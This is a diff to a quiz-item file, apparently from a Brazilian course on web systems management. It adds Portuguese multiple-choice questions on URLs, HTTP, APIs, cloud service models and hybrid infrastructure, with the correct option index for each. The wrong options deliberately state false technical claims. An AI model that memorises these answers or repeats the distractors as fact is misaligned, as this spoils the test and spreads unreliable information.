@@ -692,6 +692,156 @@
     "resolucao": "pela sintaxe genérica da RFC 3986, o fragmento é sempre o último componente da URL; uma vez que o símbolo # aparece, tudo o que o segue -- inclusive um trecho que parece uma query string -- é tratado como parte do fragmento, e nunca é enviado ao servidor (o fragmento é processado inteiramente pelo navegador). Isso explica por que o cupom não seria aplicado nesse cenário invertido -- o oposto do que ocorria na URL original do item anterior. {{D}} é o distrator mais sedutor por descrever um resultado parcialmente plausível (a rolagem funcionaria), mas erra ao afirmar que isso ocorre 'sem efeito colateral': o cupom simplesmente nunca chegaria ao servidor. {{B}} e {{E}} erram ao supor que a sintaxe malformada bloquearia o carregamento -- URLs com fragment mal posicionado continuam sendo tecnicamente válidas, apenas com efeito diferente do pretendido."
   },
   {
+    "id": "gestaoweb-cap1-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor afirma que \"internet e web são a mesma coisa\". Um colega discorda. Com base nos conceitos estudados, qual é a distinção correta e como um exemplo prático ilustra essa diferença?",
+    "alternativas": [
+      "O desenvolvedor está correto: internet e web são sinônimos no contexto técnico moderno — ambos os termos descrevem a rede global de computadores interligados que permite acesso a conteúdo digital; a distinção é apenas histórica e não tem relevância prática para desenvolvedores web.",
+      "São diferentes: a internet é a infraestrutura que interliga redes e suporta vários serviços (e-mail, WhatsApp); a web é o conjunto de páginas e aplicações acessadas por HTTP, URL e HTML; um site aberto no navegador é web.",
+      "A distinção é só de protocolo: internet usa TCP/IP e web usa HTTP, então tudo que usa HTTP é internet e web ao mesmo tempo.",
+      "Internet é pública e web é privada: a internet conecta computadores do mundo inteiro de forma aberta, enquanto a web é uma rede privada corporativa que usa a infraestrutura da internet para transmitir páginas HTML — por isso empresas precisam de servidores web separados da infraestrutura de internet que já possuem."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um sistema de e-commerce tem arquitetura de duas camadas: a aplicação roda no computador do cliente e acessa diretamente o banco de dados no servidor. Qual é o principal problema dessa arquitetura e como a arquitetura de três camadas resolve?",
+    "alternativas": [
+      "O principal problema é de segurança de rede: em duas camadas, o banco de dados fica exposto diretamente na internet — a arquitetura de três camadas resolve adicionando um firewall entre o cliente e o banco, sem necessidade de servidor de aplicação intermediário.",
+      "Manutenção: mudar uma regra de negócio exige reinstalar o software em todos os clientes; com três camadas, a lógica fica num servidor de aplicação e é atualizada uma vez só, para todos.",
+      "O principal problema é de performance: com duas camadas, o banco de dados processa tanto os dados quanto as regras de negócio simultaneamente, gerando sobrecarga — a arquitetura de três camadas resolve dividindo o processamento em três máquinas físicas diferentes, triplicando a capacidade computacional total do sistema.",
+      "Compatibilidade: duas camadas só funcionam no Windows, e três camadas resolvem isso com HTTP e XML."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Analisando a URL http://virtual.faculdade.com.br:8080/pos/marketing?turma=2024&turno=noite#cronograma, identifique corretamente cada componente e sua função.",
+    "alternativas": [
+      "virtual é o domínio principal, faculdade.com.br é o subdomínio, 8080 é o identificador de fragmento, /pos/marketing são parâmetros de consulta e ?turma=2024&turno=noite é o caminho do recurso — a estrutura da URL começa sempre pelo subdomínio seguido do domínio principal.",
+      "http é o protocolo; virtual, o subdomínio; faculdade.com.br, o domínio; 8080, a porta; /pos/marketing, o caminho; ?turma=2024&turno=noite, os parâmetros; e #cronograma, o fragmento que leva a uma seção da página.",
+      "http é o protocolo, faculdade é o domínio, .com.br é a extensão internacional, virtual é o fragmento de subdomínio, 8080 é o código de status da resposta, /pos/marketing é o nome do arquivo físico no servidor e #cronograma é o parâmetro de busca que filtra conteúdo da página.",
+      "virtual.faculdade.com.br é o domínio completo sem distinção de subdomínio, 8080 é a versão do protocolo HTTP utilizada, /pos/marketing são diretórios físicos obrigatoriamente existentes no servidor, turma=2024 é o identificador único do recurso e #cronograma indica o protocolo seguro HTTPS alternativo."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor recebe resposta HTTP 200 após tentativa de login com senha incorreta. Ele afirma que \"o login funcionou porque a resposta foi 200 OK\". Por que essa interpretação está equivocada?",
+    "alternativas": [
+      "A interpretação está correta: código 200 significa que a operação foi completamente bem-sucedida em todos os aspectos — se o servidor retornou 200, o login foi aprovado e o usuário está autenticado; qualquer falha de autenticação deveria retornar obrigatoriamente código 401 segundo as especificações HTTP.",
+      "O 200 só indica que a requisição foi processada, não que o login deu certo; o corpo pode trazer \"senha incorreta\", e código HTTP e resultado de negócio devem ser verificados separadamente.",
+      "O código 200 para login incorreto é um erro de implementação grave que viola as especificações HTTP: servidores bem configurados sempre retornam 403 Forbidden para credenciais inválidas — receber 200 em falha de login indica que o servidor foi comprometido e o desenvolvedor deve reportar imediatamente ao time de segurança.",
+      "Só está errada em sistemas bancários, que por regra escondem o motivo da falha no corpo da resposta."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa migra de arquitetura monolítica para microsserviços para seu e-commerce, separando catálogo, carrinho e pagamento em serviços independentes. Um desenvolvedor questiona: \"se agora são independentes, como eles se comunicam?\" Qual é a resposta técnica correta?",
+    "alternativas": [
+      "Não se comunicam: cada serviço guarda uma cópia dos dados dos outros, sincronizada de tempos em tempos.",
+      "Por APIs com acoplamento fraco: o carrinho chama os endpoints do catálogo e envia dados ao pagamento, ou usam filas de mensagens; cada serviço conhece só a interface do outro, não sua implementação.",
+      "A comunicação entre microsserviços acontece exclusivamente por banco de dados compartilhado: cada serviço lê e escreve em tabelas específicas de um banco central — essa é a forma padrão de integração em arquiteturas de microsserviços, pois evita a complexidade de chamadas HTTP entre serviços e garante consistência transacional automática.",
+      "Microsserviços independentes não precisam se comunicar: a independência significa que cada serviço é uma aplicação completa e autossuficiente — catálogo, carrinho e pagamento são acessados diretamente pelo frontend sem qualquer interação entre eles, e o usuário é responsável por transportar as informações de um serviço para outro durante sua navegação."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um sistema usa GraphQL enquanto outro usa REST. Um gerente pergunta qual é \"o melhor\". Como explicar tecnicamente a diferença e quando cada um é mais adequado?",
+    "alternativas": [
+      "REST é sempre superior ao GraphQL: REST é um padrão consolidado pelo W3C com décadas de adoção, enquanto GraphQL é uma tecnologia proprietária do Facebook sem padronização internacional — empresas sérias sempre escolhem REST por sua maturidade e amplo suporte em todas as linguagens e plataformas de desenvolvimento.",
+      "GraphQL é sempre superior ao REST: permitir que o cliente solicite exatamente os dados necessários elimina completamente os problemas de over-fetching e under-fetching presentes no REST — toda nova API deveria ser implementada em GraphQL, e sistemas REST legados deveriam ser migrados o quanto antes para eliminar ineficiências.",
+      "REST usa endpoints fixos com formato predefinido, bom para APIs públicas e CRUD; GraphQL usa um endpoint onde o cliente pede só os campos que quer, bom para frontends que precisam de dados flexíveis de várias fontes.",
+      "A diferença é só de sintaxe: os dois são equivalentes, e a escolha depende apenas da familiaridade da equipe."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap1-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "O protocolo HTTP é descrito como \"stateless\" (sem estado). Um desenvolvedor questiona como sistemas como internet banking conseguem manter o usuário logado entre páginas se o protocolo não guarda informações. Qual é a explicação correta?",
+    "alternativas": [
+      "HTTP é stateless apenas na teoria: na prática, os servidores HTTP modernos mantêm conexões persistentes TCP que guardam automaticamente o estado da sessão — o navegador usa essa conexão persistente para saber que o usuário está logado, sem necessidade de mecanismos adicionais como cookies.",
+      "Cada requisição HTTP é independente, e o protocolo não guarda estado; a sessão é mantida pela aplicação, por exemplo com um cookie que leva o identificador da sessão ou com um token enviado a cada requisição.",
+      "HTTP stateless é uma característica apenas do HTTP/1.0: a partir do HTTP/1.1 e especialmente no HTTP/2, o protocolo passou a suportar estado nativo através de headers de sessão padronizados — sistemas de internet banking modernos usam esses headers de sessão HTTP nativos sem precisar de cookies ou tokens adicionais.",
+      "A manutenção de sessão no internet banking não usa o protocolo HTTP: após o login inicial via HTTP, a comunicação migra automaticamente para um protocolo bancário proprietário que suporta estado nativo — por isso clientes de internet banking precisam de certificados digitais específicos que ativam esse protocolo seguro e stateful nos servidores bancários."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa decide criar uma API pública para parceiros acessarem seus dados de produtos. Ao definir as melhores práticas, surgem discussões sobre versionamento. Por que o versionamento de API é crítico e quais problemas sua ausência causa?",
+    "alternativas": [
+      "Versionamento de API é desnecessário se a documentação for clara: parceiros que usam a API devem acompanhar as mudanças através da documentação atualizada e ajustar seus sistemas — a responsabilidade pela compatibilidade é do consumidor da API, não do provedor, que deve ter liberdade total para evoluir sua interface.",
+      "Sem versão, uma mudança pode quebrar sem aviso as integrações dos parceiros; com /v1 e /v2, a versão antiga continua funcionando enquanto eles migram, o que permite evoluir sem ruptura.",
+      "Versionamento só é necessário para APIs públicas abertas: APIs de parceiros estratégicos têm SLAs que obrigam os parceiros a atualizar seus sistemas em 24 horas após qualquer mudança — com esse SLA, o provedor pode alterar a API livremente sem versionamento, pois os parceiros são contratualmente obrigados a se adaptar imediatamente.",
+      "Quem resolve a compatibilidade é o HTTPS: o certificado de cada versão controla quem pode acessá-la."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um estudante confunde Gateway, Roteador e Firewall, usando os termos como sinônimos. Qual cenário prático ilustra corretamente a função distinta de cada um em uma rede corporativa?",
+    "alternativas": [
+      "Os três termos descrevem o mesmo dispositivo com funções diferentes ativadas por configuração: qualquer roteador moderno pode funcionar como gateway ou firewall dependendo do software instalado — a distinção é apenas comercial, criada pelos fabricantes para justificar a venda de equipamentos separados que poderiam ser unificados.",
+      "O gateway liga a rede interna à internet e traduz protocolos; o roteador escolhe o caminho dos pacotes pelo endereço IP; o firewall decide quais conexões passam; ou seja, conecta, direciona e protege.",
+      "Gateway e firewall são o mesmo dispositivo; só o roteador tem função própria, dentro da rede local.",
+      "O Roteador substitui completamente o Gateway em redes modernas: com IPv6 e protocolos unificados, não é mais necessário traduzir entre protocolos diferentes — apenas Roteador e Firewall são necessários em infraestruturas atuais; o conceito de Gateway é legado dos anos 1990 aplicável apenas a sistemas que ainda usam protocolos obsoletos como IPX/SPX ou AppleTalk."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap1-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap1",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "O W3C é descrito como responsável pela padronização da web. Um desenvolvedor questiona por que o processo de aprovação de padrões como o HTML5 leva mais de 10 anos. Qual é a justificativa técnica e organizacional correta?",
+    "alternativas": [
+      "O processo lento do W3C é resultado de burocracia política entre países membros: nações com interesses comerciais distintos bloqueam aprovações para proteger tecnologias proprietárias de suas empresas — a demora não tem justificativa técnica e é considerada uma falha grave do modelo de governança que deveria ser reformado urgentemente.",
+      "Um padrão afeta toda a web: navegadores, ferramentas e milhões de sites existentes; por isso passa por rascunhos, consultas públicas e etapas de recomendação, já que erros num padrão aprovado são caros de corrigir.",
+      "A demora vem só dos navegadores, que levam anos para reescrever o motor de renderização.",
+      "O processo lento é estratégia deliberada para beneficiar grandes empresas: padrões lentos permitem que Google, Microsoft e Apple implementem extensões proprietárias e criem dependência antes da padronização — quando o W3C finalmente aprova, as empresas já dominam o mercado com sua versão proprietária e o padrão oficial é apenas uma formalidade sem impacto real no ecossistema de desenvolvimento web."
+    ],
+    "correta": 1
+  },
+  {
     "id": "gestaoweb-cap2-q1",
     "disciplinaId": "gestao-de-sistemas-digitais-na-web",
     "capituloId": "gestaoweb-cap2",
@@ -910,6 +1060,156 @@
     "resolucao": "a SaúdeBem ilustra exatamente a prática de migração gradual, começando pelo componente de menor risco e usando o aprendizado de cada etapa para calibrar a seguinte, reservando o componente mais crítico (pagamentos) para quando a equipe já tem mais experiência e confiança no processo. {{E}} inverte perigosamente essa lógica: migrar o componente mais crítico primeiro, sem qualquer experiência prévia acumulada, maximiza o risco exatamente onde o impacto de um erro seria maior."
   },
   {
+    "id": "gestaoweb-cap2-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma startup decide migrar toda sua infraestrutura para a nuvem motivada pela promessa de \"redução de custos\". Seis meses depois, a fatura mensal supera o custo anterior com servidores próprios. Quais fatores explicam esse resultado e o que deveria ter sido feito?",
+    "alternativas": [
+      "A nuvem é sempre mais cara que infraestrutura própria para startups: o modelo de cobrança por uso beneficia exclusivamente grandes corporações com previsibilidade de demanda — startups com crescimento irregular deveriam sempre manter servidores próprios independentemente do estágio de crescimento.",
+      "Custos mal estimados são causa comum de volta para servidores próprios: sem planejar, processamento, armazenamento e tráfego crescem; faltou mapear aplicações antes, monitorar os custos e considerar um modelo híbrido.",
+      "O problema foi a escolha do provedor: AWS, Azure e Google Cloud têm estruturas de preço diferentes, e a startup escolheu o provedor mais caro — bastaria migrar para outro provedor com preços menores para resolver o problema sem necessidade de rever a estratégia de migração completa para a nuvem.",
+      "Custos elevados na nuvem são inevitáveis nos primeiros 12 meses e representam o período de amortização do investimento em migração — após esse período inicial, os custos estabilizam automaticamente abaixo dos valores de infraestrutura própria; a startup deveria aguardar mais 6 meses antes de avaliar o resultado financeiro da migração."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap2-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor usa Gmail para e-mail corporativo, Google App Engine para hospedar sua aplicação e contrata AWS para servidores virtuais. Classifique corretamente cada serviço no modelo de computação em nuvem.",
+    "alternativas": [
+      "Gmail é PaaS pois oferece plataforma completa de comunicação para desenvolvedores; Google App Engine é SaaS pois é um software de hospedagem acessível via navegador; AWS com servidores virtuais é BaaS pois fornece backend completo sem necessidade de configuração manual dos servidores.",
+      "Gmail é SaaS (aplicação pronta no navegador); Google App Engine é PaaS (ambiente para criar e implantar sem cuidar da infraestrutura); servidores virtuais da AWS são IaaS (recursos que o desenvolvedor configura).",
+      "Gmail é IaaS pois fornece infraestrutura de servidores de e-mail; Google App Engine é BaaS pois gerencia automaticamente o backend da aplicação; AWS com servidores virtuais é PaaS pois oferece plataforma completa de desenvolvimento com sistema operacional, runtime e ferramentas de deployment integradas.",
+      "Todos são SaaS: a divisão em IaaS, PaaS e SaaS só vale em contratos corporativos."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap2-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um hospital com dados de prontuários eletrônicos avalia migrar para nuvem pública. O CTO questiona se isso é adequado para um setor altamente regulado. Qual é a análise estratégica correta considerando os modelos disponíveis?",
+    "alternativas": [
+      "A nuvem pública é proibida a hospitais, que devem manter todos os dados em servidores próprios.",
+      "Um modelo híbrido: prontuários e dados sensíveis ficam on-premises, por controle e conformidade com a LGPD e as normas do CFM, e serviços escaláveis e não críticos, como análises e sistemas administrativos, vão para a nuvem.",
+      "Nuvem privada é a única solução para hospitais: o hospital deve contratar um datacenter dedicado exclusivo administrado por um provedor de nuvem — essa configuração oferece os benefícios da nuvem (escalabilidade, acesso remoto) mantendo total isolamento de outros clientes, sendo a solução universalmente adotada por hospitais de qualquer porte que migraram para nuvem.",
+      "A regulamentação não é impeditivo para nuvem pública em hospitais: provedores como AWS e Azure têm certificações de saúde (HIPAA nos EUA) que resolvem completamente os requisitos regulatórios — qualquer hospital pode migrar toda sua infraestrutura para nuvem pública usando provedores certificados sem necessidade de análise adicional de conformidade com a legislação brasileira."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap2-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa de e-commerce usa exclusivamente infraestrutura on-premises e percebe que na Black Friday seus servidores não suportam o pico de acessos, mas ficam ociosos 95% do ano. Qual modelo de infraestrutura resolve esse problema de forma mais estratégica?",
+    "alternativas": [
+      "A solução é dimensionar o on-premises para o pico máximo: comprar servidores suficientes para a Black Friday resolve definitivamente o problema de capacidade — o custo de ociosidade durante 95% do ano é justificado pela segurança de ter infraestrutura própria para os momentos críticos de maior demanda.",
+      "A solução é migrar completamente para nuvem pública: e-commerces não têm dados suficientemente sensíveis para justificar infraestrutura própria — os custos de nuvem pública são sempre menores que on-premises para qualquer volume de transações, e a escalabilidade automática resolve o problema de pico sem qualquer configuração adicional.",
+      "O híbrido: a operação regular e os dados críticos ficam on-premises, e a nuvem absorve os picos sazonais como a Black Friday, sem comprar hardware que ficaria ocioso o resto do ano.",
+      "Usar BaaS, que terceiriza o backend e escala sozinho, sem nenhuma configuração."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap2-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor explica que usa BaaS para focar no frontend sem se preocupar com banco de dados e autenticação. Um colega confunde BaaS com PaaS. Qual é a distinção técnica fundamental entre os dois modelos?",
+    "alternativas": [
+      "BaaS e PaaS são sinônimos modernos para o mesmo conceito: ambos fornecem infraestrutura gerenciada para desenvolvedores focarem no código da aplicação — a distinção é apenas de marketing, com BaaS sendo o termo mais recente usado pelos mesmos provedores que anteriormente chamavam seus serviços de PaaS.",
+      "A diferença é apenas de escala: PaaS é para grandes aplicações corporativas com times de desenvolvimento numerosos, enquanto BaaS é para startups e desenvolvedores individuais — a escolha entre os dois depende exclusivamente do tamanho da empresa e do orçamento disponível, não das características técnicas dos serviços oferecidos.",
+      "PaaS gerencia a plataforma (SO, runtime), mas o desenvolvedor ainda cria o backend; BaaS entrega o backend pronto, com banco, autenticação, armazenamento e notificações por API, e o desenvolvedor só consome.",
+      "PaaS é para aplicações web e BaaS é exclusivamente para aplicações mobile: o Firebase (BaaS do Google) só funciona com apps iOS e Android, enquanto Google App Engine (PaaS) só funciona com aplicações web acessadas por navegadores — essa distinção por tipo de cliente é o critério técnico que define se um serviço de nuvem é classificado como PaaS ou BaaS."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap2-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa financeira avalia a afirmação: \"A nuvem é sempre mais segura que on-premises porque os provedores investem bilhões em segurança\". O CISO discorda. Qual é a análise de segurança mais completa e equilibrada?",
+    "alternativas": [
+      "O CISO está totalmente errado: provedores como AWS e Azure têm equipes de segurança de milhares de pessoas e certificações como ISO 27001 e SOC 2 — nenhuma empresa financeira consegue atingir esse nível de segurança com infraestrutura própria; migrar para nuvem sempre aumenta a segurança independentemente do contexto ou da configuração adotada.",
+      "É parcialmente verdade: o provedor protege a infraestrutura, mas, pela responsabilidade compartilhada, configuração, acessos e dados são da empresa; dependência de terceiros e regras do setor podem favorecer o híbrido.",
+      "Está errada: na nuvem pública, funcionários do provedor sempre podem ler os dados financeiros.",
+      "A segurança na nuvem é superior ao on-premises exclusivamente para empresas com menos de 100 funcionários: organizações financeiras de grande porte têm recursos para manter equipes de segurança que superam os provedores de nuvem; para bancos com mais de 1.000 funcionários, infraestrutura on-premises é obrigatoriamente mais segura do que qualquer solução de nuvem disponível no mercado."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap2-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa de logística migrou um sistema legado monolítico para a nuvem sem refatoração. O sistema passou a apresentar falhas frequentes e custos 3x maiores que o esperado. Quais são os erros de abordagem identificados?",
+    "alternativas": [
+      "O único erro foi o provedor; trocar de fornecedor resolveria, sem refatorar nada.",
+      "Migrar sem planejar nem refatorar: o monolito não aproveita a elasticidade da nuvem e consome recursos mal, encarecendo a operação; faltaram arquitetura adequada, testes, monitoramento e estimativa de custos.",
+      "O problema foi a migração gradual: migrar partes de um sistema monolítico por etapas cria inconsistências e gera mais problemas do que uma migração completa de uma só vez — sistemas legados devem sempre ser migrados integralmente em um único evento para evitar estados intermediários inconsistentes que causam falhas e custos inesperados.",
+      "Sistemas monolíticos são incompatíveis com nuvem por definição: a única solução é reescrever completamente o sistema do zero em arquitetura de microsserviços antes de qualquer migração para nuvem — tentativas de adaptar código legado para nuvem nunca funcionam e representam desperdício de recursos que deveria ter sido investido no desenvolvimento de um sistema novo."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap2-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um gerente de TI afirma que \"nuvem híbrida é complicada demais e uma empresa deveria escolher apenas nuvem ou apenas on-premises para simplificar\". Um arquiteto discorda. Qual é o argumento técnico mais sólido a favor do modelo híbrido?",
+    "alternativas": [
+      "O gerente está certo: o híbrido é só transitório, usado durante a migração completa.",
+      "O modelo híbrido só é vantajoso para empresas com mais de 500 funcionários: a complexidade de integração entre sistemas on-premises e nuvem requer equipes grandes de TI para gerenciar; startups e médias empresas obtêm melhores resultados com nuvem pública exclusiva que simplifica completamente a gestão de infraestrutura sem comprometer segurança ou desempenho.",
+      "O híbrido é flexibilidade: dados críticos e sistemas sensíveis à latência ficam on-premises, e a nuvem escala o que não é crítico e permite testar novidades, como o banco que processa transações em casa e análises na nuvem.",
+      "O arquiteto está errado: a complexidade de gerenciar dois ambientes simultaneamente sempre gera mais problemas operacionais do que qualquer benefício de flexibilidade — equipes de TI fragmentadas entre on-premises e nuvem perdem eficiência e o custo total do modelo híbrido é invariavelmente maior do que escolher apenas um dos dois modelos e executá-lo com excelência."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap2-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa está avaliando IaaS versus contratar um datacenter próprio para hospedar sua aplicação. Quais são as diferenças fundamentais e como o modelo de precificação influencia a decisão estratégica?",
+    "alternativas": [
+      "IaaS e datacenter próprio são equivalentes em custo e controle: ambos oferecem servidores, armazenamento e rede que a empresa configura e gerencia — a única diferença é que IaaS fica fisicamente nos datacenters do provedor, o que não tem impacto relevante para a maioria das aplicações empresariais modernas.",
+      "Datacenter próprio exige alto investimento inicial e tem capacidade fixa; IaaS cobra pelo uso e escala sob demanda; cargas estáveis e longas podem favorecer o próprio, e cargas variáveis ou incertas favorecem o IaaS.",
+      "IaaS é sempre a escolha correta em detrimento de datacenter próprio: nenhuma empresa consegue competir com a escala e eficiência dos datacenters da AWS, Azure ou Google — manter servidores próprios em 2025 é uma prática obsoleta que aumenta custos operacionais, dificulta inovação e expõe a empresa a riscos de segurança que os provedores de nuvem já resolveram definitivamente.",
+      "Datacenter próprio é sempre preferível ao IaaS para aplicações críticas: a propriedade física dos servidores garante controle total que IaaS não consegue replicar — mesmo que o custo inicial seja 10 vezes maior, a segurança e o desempenho de hardware dedicado justificam o investimento para qualquer empresa que processa dados sensíveis ou tem requisitos de SLA acima de 99,9% de disponibilidade."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap2-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap2",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "O material descreve que a computação em nuvem \"não é uma solução universal\". Uma empresa de jogos online com 50 milhões de usuários ativos globalmente e picos imprevisíveis de tráfego questiona qual modelo de infraestrutura adotar. Qual análise aplicaria os conceitos do capítulo para essa situação específica?",
+    "alternativas": [
+      "On-premises é a solução ideal para jogos online com 50 milhões de usuários: a previsibilidade de hardware próprio é essencial para garantir latência mínima em jogos competitivos — provedores de nuvem introduzem latência variável que prejudica a experiência de jogadores em partidas competitivas, independentemente da região geográfica dos servidores utilizados.",
+      "BaaS: o Firebase gerencia 50 milhões de usuários com picos sem nenhum planejamento.",
+      "Nuvem pública elástica: picos imprevisíveis de 50 milhões de usuários são o caso ideal para escalar e reduzir sob demanda; edge computing reduz a latência e microsserviços escalam partes isoladas, sempre monitorando os custos.",
+      "Modelo híbrido com datacenter próprio nos principais mercados e nuvem apenas para mercados secundários: jogos online exigem latência abaixo de 20ms que só servidores próprios garantem — a nuvem pode ser usada apenas para usuários em regiões geográficas onde a empresa ainda não tem volume suficiente para justificar investimento em datacenter físico dedicado."
+    ],
+    "correta": 2
+  },
+  {
     "id": "gestaoweb-cap3-q1",
     "disciplinaId": "gestao-de-sistemas-digitais-na-web",
     "capituloId": "gestaoweb-cap3",
@@ -1126,6 +1426,156 @@
     ],
     "correta": 1,
     "resolucao": "o texto de Marcotte propõe exatamente a inversão de abordagem: em vez de larguras fixas remendadas por breakpoints pontuais, usar grades fluidas com unidades relativas, que se adaptam continuamente a qualquer largura de tela, não apenas às larguras específicas testadas. {{C}} é um distrator tentador, mas descreve uma solução que apenas adia o problema (sempre faltará testar 'mais um dispositivo'); a causa raiz é a unidade de medida escolhida, não a quantidade de testes realizados."
+  },
+  {
+    "id": "gestaoweb-cap3-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor está criando uma página de portfólio pessoal com fotos de trabalhos realizados, nome, telefone e redes sociais — conteúdo que raramente muda. Seu colega sugere usar Django com banco de dados PostgreSQL. Qual é a avaliação técnica correta dessa sugestão?",
+    "alternativas": [
+      "A sugestão é correta: Django com PostgreSQL oferece flexibilidade para crescimento futuro — começar com tecnologia simples limita o portfólio e dificulta adição de funcionalidades como formulário de contato, blog e galeria dinâmica que todo portfólio profissional eventualmente precisará ter.",
+      "É complexa demais: um portfólio que quase não muda fica melhor em HTML e CSS puros, sem banco nem servidor, mais rápido e barato de manter; Django e PostgreSQL servem a aplicações dinâmicas.",
+      "A sugestão está correta apenas se o portfólio tiver mais de 10 páginas: projetos simples com menos de 10 páginas funcionam bem com HTML/CSS, mas a partir desse volume a manutenção manual de páginas estáticas se torna tão complexa quanto configurar Django, justificando o banco de dados para organizar o conteúdo de forma mais eficiente.",
+      "Não há diferença prática; o desenvolvedor deve usar sempre a tecnologia que conhece melhor."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap3-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma rede social como Instagram exibe para cada usuário um feed personalizado com publicações de quem segue, recomendações de conteúdo e anúncios segmentados. Qual característica fundamental das aplicações web dinâmicas explica esse comportamento e quais tecnologias estão envolvidas?",
+    "alternativas": [
+      "O feed personalizado é resultado exclusivamente do JavaScript no frontend: algoritmos de recomendação executam no navegador do usuário analisando o histórico de navegação local — o backend apenas armazena as publicações sem processamento adicional, e toda a personalização acontece no cliente sem comunicação com o servidor após o carregamento inicial.",
+      "Aplicações dinâmicas processam no servidor: o backend consulta o banco, aplica recomendações pelo perfil e histórico e devolve um conteúdo diferente para cada usuário, enquanto um site estático entrega o mesmo HTML a todos.",
+      "Personalização é exclusiva de apps mobile; na web, o HTTP impede conteúdo diferente por usuário.",
+      "O feed personalizado é obtido através de cookies no navegador: o JavaScript lê os cookies armazenados localmente e monta o feed sem comunicação com o servidor — essa abordagem elimina a necessidade de banco de dados no backend e permite que a rede social funcione completamente offline após o primeiro carregamento da página."
+    ],
+    "correta": 1
+  },
+  {
